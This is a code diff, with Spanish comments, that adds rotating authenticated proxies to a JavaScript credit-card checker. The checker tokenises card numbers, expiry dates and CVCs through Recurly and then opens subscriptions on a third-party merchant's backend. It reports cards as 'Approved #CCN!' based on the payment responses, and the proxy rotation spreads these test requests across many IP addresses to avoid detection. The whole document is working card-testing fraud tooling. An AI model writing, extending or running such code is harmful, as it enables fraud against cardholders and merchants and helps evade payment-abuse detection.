@@ -1,4 +1,57 @@
 const axios = require('axios');
+const fs = require('fs');
+const path = require('path');
+const { HttpsProxyAgent } = require('https-proxy-agent');
+
+// Función para cargar y rotar proxies
+let proxies = [];
+let currentProxyIndex = 0;
+
+function loadProxies() {
+  try {
+    const filePath = path.join(process.cwd(), 'api', 'proxies.txt');
+    const proxyData = fs.readFileSync(filePath, 'utf8');
+    proxies = proxyData.split('\n')
+      .map(line => line.trim())
+      .filter(line => line && !line.startsWith('#'));
+    
+    console.log(`Loaded ${proxies.length} proxies`);
+    return proxies.length > 0;
+  } catch (error) {
+    console.error('Error loading proxies:', error);
+    return false;
+  }
+}
+
+function getNextProxy() {
+  if (proxies.length === 0) {
+    if (!loadProxies() || proxies.length === 0) {
+      return null;
+    }
+  }
+  
+  const proxy = proxies[currentProxyIndex];
+  currentProxyIndex = (currentProxyIndex + 1) % proxies.length;
+  return proxy;
+}
+
+function createProxyAgent(proxyString) {
+  try {
+    const [ip, port, username, password] = proxyString.split(':');
+    const proxyOptions = {
+      host: ip,
+      port: port,
+      auth: `${username}:${password}`
+    };
+    return new HttpsProxyAgent(proxyOptions);
+  } catch (error) {
+    console.error('Error creating proxy agent:', error);
+    return null;
+  }
+}
+
+// Cargar proxies al iniciar
+loadProxies();
 
 // Función para generar email aleatorio
 function generateRandomEmail() {
@@ -10,9 +63,32 @@ function generateRandomEmail() {
   return `${name}${randomNum}@${domain}`;
 }
 
-// Crear token con Recurly
+// Crear token con Recurly (usando proxy)
 async function createRecurlyToken(cardNumber, month, year, cvc) {
+  // Obtener proxy
+  const proxyString = getNextProxy();
+  const proxyAgent = proxyString ? createProxyAgent(proxyString) : null;
+  const proxyInfo = proxyString ? proxyString.split(':')[0] : 'Direct';
+  
+  console.log(`Using proxy: ${proxyInfo}`);
+  
   try {
+    const axiosConfig = {
+      headers: {
+        'authority': 'api.recurly.com',
+        'accept': '*/*',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://api.recurly.com',
+        'referer': 'https://api.recurly.com/js/v1/field.html',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+      }
+    };
+    
+    // Añadir proxy si está disponible
+    if (proxyAgent) {
+      axiosConfig.httpsAgent = proxyAgent;
+    }
+    
     const response = await axios.post(
       'https://api.recurly.com/js/v1/token',
       new URLSearchParams({
@@ -36,28 +112,41 @@ async function createRecurlyToken(cardNumber, month, year, cvc) {
         'sessionId': 'Z0VJJh0T0F7Zuwmq',
         'instanceId': 'jGAuKKML687jvFC0'
       }).toString(),
-      {
-        headers: {
-          'authority': 'api.recurly.com',
-          'accept': '*/*',
-          'content-type': 'application/x-www-form-urlencoded',
-          'origin': 'https://api.recurly.com',
-          'referer': 'https://api.recurly.com/js/v1/field.html',
-          'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-        }
-      }
+      axiosConfig
     );
     
-    return response.data;
+    return { data: response.data, proxy: proxyInfo };
   } catch (error) {
     console.error('Error creating token:', error.response?.data || error.message);
     throw error;
   }
 }
 
-// Crear suscripción con Recurly
+// Crear suscripción con Recurly (usando proxy)
 async function createSubscription(tokenId) {
+  // Obtener proxy
+  const proxyString = getNextProxy();
+  const proxyAgent = proxyString ? createProxyAgent(proxyString) : null;
+  const proxyInfo = proxyString ? proxyString.split(':')[0] : 'Direct';
+  
+  console.log(`Using proxy: ${proxyInfo}`);
+  
   try {
+    const axiosConfig = {
+      headers: {
+        'authority': 'subtrack.turbograms.com',
+        'content-type': 'text/plain',
+        'origin': 'https://mysticinsight.online',
+        'referer': 'https://mysticinsight.online/',
+        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
+      }
+    };
+    
+    // Añadir proxy si está disponible
+    if (proxyAgent) {
+      axiosConfig.httpsAgent = proxyAgent;
+    }
+    
     const response = await axios.post(
       'https://subtrack.turbograms.com/rec/create-subscription-no-user',
       {
@@ -69,21 +158,13 @@ async function createSubscription(tokenId) {
           client_user_agent: 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
         }
       },
-      {
-        headers: {
-          'authority': 'subtrack.turbograms.com',
-          'content-type': 'text/plain',
-          'origin': 'https://mysticinsight.online',
-          'referer': 'https://mysticinsight.online/',
-          'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
-        }
-      }
+      axiosConfig
     );
     
-    return response;
+    return { response, proxy: proxyInfo };
   } catch (error) {
     console.error('Error creating subscription:', error.response?.data || error.message);
-    throw error;
+    throw { error, proxy: proxyInfo };
   }
 }
 
@@ -113,19 +194,26 @@ async function checkCard(cardNumber, month, year, cvc) {
     console.log('Starting card check process...');
     
     // Paso 1: Crear token
-    const tokenResponse = await createRecurlyToken(cardNumber, month, year, cvc);
+    const tokenResult = await createRecurlyToken(cardNumber, month, year, cvc);
+    const tokenResponse = tokenResult.data;
+    const tokenProxy = tokenResult.proxy;
+    
     console.log('Token created:', tokenResponse.id);
     
     if (!tokenResponse || !tokenResponse.id) {
       return {
         success: false,
         message: 'Could not create token',
-        details: tokenResponse
+        details: tokenResponse,
+        proxy: tokenProxy
       };
     }
     
     // Paso 2: Crear suscripción
-    const subscriptionResponse = await createSubscription(tokenResponse.id);
+    const subscriptionResult = await createSubscription(tokenResponse.id);
+    const subscriptionResponse = subscriptionResult.response;
+    const subscriptionProxy = subscriptionResult.proxy;
+    
     console.log('Subscription response received');
 
     // Procesar respuesta
@@ -156,15 +244,16 @@ async function checkCard(cardNumber, month, year, cvc) {
         type: getTypeFromNumber(cardNumber)
       },
       result: message,
-      status: status
+      status: status,
+      proxy: `${tokenProxy}/${subscriptionProxy}`
     };
 
   } catch (error) {
     console.error('Error in card check process:', error);
     
     // Manejar errores específicos
-    if (error.response?.data?.error?.toLowerCase().includes('cvv') || 
-        error.response?.data?.error?.toLowerCase().includes('security code')) {
+    if (error.error?.response?.data?.error?.toLowerCase().includes('cvv') || 
+        error.error?.response?.data?.error?.toLowerCase().includes('security code')) {
       return {
         success: true,
         card: {
@@ -174,14 +263,16 @@ async function checkCard(cardNumber, month, year, cvc) {
           type: getTypeFromNumber(cardNumber)
         },
         result: "Approved #CCN! 🟩",
-        status: "approved"
+        status: "approved",
+        proxy: error.proxy || 'Unknown'
       };
     }
 
     return {
       success: false,
-      message: error.message || 'Error checking card',
-      error: error.toString()
+      message: error.error?.message || error.message || 'Error checking card',
+      error: error.error?.toString() || error.toString(),
+      proxy: error.proxy || 'Unknown'
     };
   }
 }
